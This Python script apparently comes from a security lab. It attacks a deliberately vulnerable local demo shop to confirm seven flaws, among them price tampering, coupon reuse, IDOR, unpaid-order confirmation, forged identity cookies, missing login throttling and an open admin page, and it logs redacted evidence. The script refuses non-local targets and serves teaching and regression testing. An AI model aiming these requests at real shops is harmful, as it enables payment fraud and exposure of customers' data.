"""
Attacks the NAIVE SHOP (http://127.0.0.1:8010) to prove each deliberate
vulnerability actually works. Standard library only.

These are the SAME attack ideas we re-tested against SecureShop
(run_regression.py). Here they SUCCEED; against SecureShop they are blocked.

Output: prints results and writes a new, dated file under
red_team/evidence/naive_shop/ (existing evidence is never overwritten).
Run the naive shop first:  python naive_shop/app.py
"""
import argparse
import json
import pathlib
import urllib.error
import urllib.request
from datetime import datetime, timezone
from urllib.parse import urlparse

BASE = "http://127.0.0.1:8010"
EVIDENCE_DIR = pathlib.Path(__file__).resolve().parents[1] / "evidence" / "naive_shop"
OUT = None
rows = []
exchanges = []


def rec(vid, name, status, detail):
    rows.append((vid, name, status, detail))
    print(f"[{status:>26}] {vid} {name}\n      {detail}")


def req(method, path, body=None, cookie=None):
    headers = {"Content-Type": "application/json"}
    if cookie:
        headers["Cookie"] = cookie
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=10)
        code, response_body, response_headers = (
            resp.getcode(), resp.read().decode("utf-8", "replace"), dict(resp.headers)
        )
    except urllib.error.HTTPError as e:
        code, response_body, response_headers = (
            e.code, e.read().decode("utf-8", "replace"), dict(e.headers)
        )

    safe_body = dict(body) if isinstance(body, dict) else body
    if isinstance(safe_body, dict) and "password" in safe_body:
        safe_body["password"] = "[REDACTED]"
    exchanges.append({
        "method": method,
        "url": BASE + path,
        "request_headers": {
            "Host": urlparse(BASE).netloc,
            **headers,
        },
        "request_body": json.dumps(safe_body) if safe_body is not None else None,
        "status": code,
        "response_headers": response_headers,
        "response_body": response_body,
    })
    return code, response_body, response_headers.get("Set-Cookie", "")


def main():
    global OUT
    parser = argparse.ArgumentParser(description="Run V1-V7 against the local Naive Shop.")
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    parser.add_argument(
        "--output",
        type=pathlib.Path,
        default=EVIDENCE_DIR / f"naive_attack_{timestamp}.md",
        help="new evidence filename inside red_team/evidence/naive_shop/",
    )
    args = parser.parse_args()
    parsed_base = urlparse(BASE)
    if parsed_base.scheme != "http" or parsed_base.hostname != "127.0.0.1" or parsed_base.port != 8010:
        raise SystemExit("Refusing to test a non-local Naive Shop target.")
    OUT = args.output.resolve()
    if OUT.parent != EVIDENCE_DIR.resolve():
        raise SystemExit("Evidence output must stay inside red_team/evidence/naive_shop/.")
    if OUT.exists():
        raise SystemExit(f"Refusing to overwrite existing evidence: {OUT}")

    reset_code, reset_body, _ = req("GET", "/reset")
    assert reset_code == 200 and json.loads(reset_body).get("ok") is True

    # login as alice, capture the (trusted) identity cookie
    _, _, setc = req("POST", "/api/login", {"username": "alice", "password": "alice123"})
    if not setc:
        raise RuntimeError('Login precondition failed; no fabricated cookie fallback')
    cookie = setc.split(";")[0]

    # V1 - client-controlled price: pay $1 for the $1337 jacket
    code, body, _ = req("POST", "/api/checkout",
                        {"product_id": 1, "price": 1}, cookie=cookie)
    result = json.loads(body)
    charged = result.get("charged")
    assert code == 200 and charged == 1
    state_code, state_body, _ = req("GET", f"/api/orders/{result['order_id']}", cookie=cookie)
    order_state = json.loads(state_body)
    assert state_code == 200 and order_state.get("total") == 1.0
    rec("V1", "Client-controlled price", "CONFIRMED VULNERABILITY",
        f"checkout charged ${charged} and stored total=${order_state['total']} for the $1337 jacket")

    # V2 - coupon reuse / stacking: apply SAVE20 twice
    code1, body1, _ = req("POST", "/api/apply_coupon", {"code": "SAVE20", "subtotal": 100})
    code2, body2, _ = req("POST", "/api/apply_coupon", {"code": "SAVE20", "subtotal": 100})
    r1, r2 = json.loads(body1), json.loads(body2)
    assert code1 == code2 == 200
    assert r1['new_subtotal'] == 80 and r2['new_subtotal'] == 80
    rec("V2", "Coupon reuse (no tracking)", "CONFIRMED VULNERABILITY",
        f"same coupon accepted twice: {r1['discount_percent']}% then {r2['discount_percent']}% again")

    # V3 - IDOR: bob reads alice's order
    oid = json.loads(req("POST", "/api/checkout", {"product_id": 1, "price": 1}, cookie=cookie)[1])["order_id"]
    code, body, _ = req("GET", f"/api/orders/{oid}", cookie="user=bob")
    assert code == 200 and json.loads(body).get('owner') == 'alice'
    rec("V3", "IDOR (read other user's order)", "CONFIRMED VULNERABILITY",
        f"bob fetched alice's order #{oid} -> HTTP {code}, owner={json.loads(body).get('owner')!r}")

    # V4 - workflow bypass: confirm without paying
    assert json.loads(body)['paid'] is False
    code, body, _ = req("GET", f"/api/confirm?order={oid}", cookie="user=bob")
    assert json.loads(body)['order']['paid'] is True
    rec("V4", "Workflow bypass (confirm unpaid)", "CONFIRMED VULNERABILITY",
        f"order #{oid} marked paid={json.loads(body)['order']['paid']} with no payment")

    # V5 - client-controlled identity: forge the user cookie, no password
    code, body, _ = req("POST", "/api/checkout", {'product_id':1,'price':1}, cookie="user=whoever")
    forged_id = json.loads(body)['order_id']
    forged = json.loads(req('GET',f'/api/orders/{forged_id}')[1])
    assert code == 200 and forged['owner'] == 'whoever'
    rec("V5", "Client-controlled identity", "CONFIRMED VULNERABILITY",
        "the 'user' cookie is trusted unchanged; no server-side session")

    # V6 - no login throttling
    codes = [req("POST", "/api/login", {"username": "alice", "password": "wrong"})[0] for _ in range(8)]
    assert codes == [401] * 8
    rec("V6", "No login throttling", "CONFIRMED VULNERABILITY",
        f"8 bad logins all returned {set(codes)} - never locked out")

    # V7 - broken access control: /admin open to anyone
    code, admin_body, _ = req("GET", "/admin")
    assert code == 200 and all(x in admin_body for x in ('alice', 'bob', 'credit'))
    rec("V7", "Broken access control (/admin open)", "CONFIRMED VULNERABILITY",
        f"GET /admin with no login -> HTTP {code} (full user table)")

    OUT.parent.mkdir(parents=True, exist_ok=True)
    lines = ["# Naive Shop - Attack Results (all vulnerabilities confirmed)", "",
             f"- Timestamp: {datetime.now(timezone.utc).isoformat()}",
             "- Assertions verify observed response/state; coupon result proves repeated discount calculation, not completed discounted purchases.",
             f"- Target: `{BASE}` (intentionally insecure demo)", "",
             "| ID | Vulnerability | Status | Detail |", "|---|---|---|---|"]
    for vid, name, status, detail in rows:
        lines.append(f"| {vid} | {name} | {status} | {detail} |")
    lines.extend(["", "## Captured HTTP exchanges", "",
                  "Password values are redacted; all other request/response details below were captured from this run.", ""])
    for i, exchange in enumerate(exchanges, 1):
        path = urlparse(exchange["url"]).path
        if urlparse(exchange["url"]).query:
            path += "?" + urlparse(exchange["url"]).query
        lines.extend([
            f"### Exchange {i}: {exchange['method']} {path}",
            "",
            "```http",
            f"{exchange['method']} {path} HTTP/1.1",
            *[f"{key}: {value}" for key, value in exchange["request_headers"].items()],
        ])
        if exchange["request_body"] is not None:
            lines.append("")
            lines.append(exchange["request_body"])
        lines.extend([
            "```",
            "",
            "```http",
            f"HTTP/1.0 {exchange['status']}",
            *[f"{key}: {value}" for key, value in exchange["response_headers"].items()],
            "",
            exchange["response_body"],
            "```",
            "",
        ])
    OUT.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"\nWrote -> {OUT}")


if __name__ == "__main__":
    main()
